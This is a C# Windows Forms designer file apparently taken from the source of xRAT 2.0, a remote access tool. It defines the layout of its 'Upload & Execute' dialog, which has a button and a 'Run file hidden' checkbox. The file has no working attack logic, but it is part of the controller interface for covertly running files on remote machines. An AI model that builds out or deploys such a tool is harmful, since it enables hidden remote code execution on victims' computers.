namespace xRAT_2.Forms
{
    partial class frmUploadAndExecute
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(frmUploadAndExecute));
            this.btnUploadAndExecute = new System.Windows.Forms.Button();
            this.chkRunHidden = new System.Windows.Forms.CheckBox();
            this.SuspendLayout();
            // 
            // btnUploadAndExecute
            // 
            this.btnUploadAndExecute.Location = new System.Drawing.Point(12, 12);
            this.btnUploadAndExecute.Name = "btnUploadAndExecute";
            this.btnUploadAndExecute.Size = new System.Drawing.Size(291, 36);
            this.btnUploadAndExecute.TabIndex = 0;
            this.btnUploadAndExecute.Text = "Upload && Execute";
            this.btnUploadAndExecute.UseVisualStyleBackColor = true;
            this.btnUploadAndExecute.Click += new System.EventHandler(this.btnUploadAndExecute_Click);
            // 
            // chkRunHidden
            // 
            this.chkRunHidden.AutoSize = true;
            this.chkRunHidden.Location = new System.Drawing.Point(12, 54);
            this.chkRunHidden.Name = "chkRunHidden";
            this.chkRunHidden.Size = new System.Drawing.Size(106, 17);
            this.chkRunHidden.TabIndex = 1;
            this.chkRunHidden.Text = "Run file hidden";
            this.chkRunHidden.UseVisualStyleBackColor = true;
            // 
            // frmUploadAndExecute
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.ClientSize = new System.Drawing.Size(315, 76);
            this.Controls.Add(this.chkRunHidden);
            this.Controls.Add(this.btnUploadAndExecute);
            this.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedDialog;
            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
            this.MaximizeBox = false;
            this.MinimizeBox = false;
            this.Name = "frmUploadAndExecute";
            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            this.Text = "xRAT 2.0 - Upload & Execute []";
            this.Load += new System.EventHandler(this.frmUploadAndExecute_Load);
            this.ResumeLayout(false);
            this.PerformLayout();

        }

        #endregion

        private System.Windows.Forms.Button btnUploadAndExecute;
        private System.Windows.Forms.CheckBox chkRunHidden;
    }
}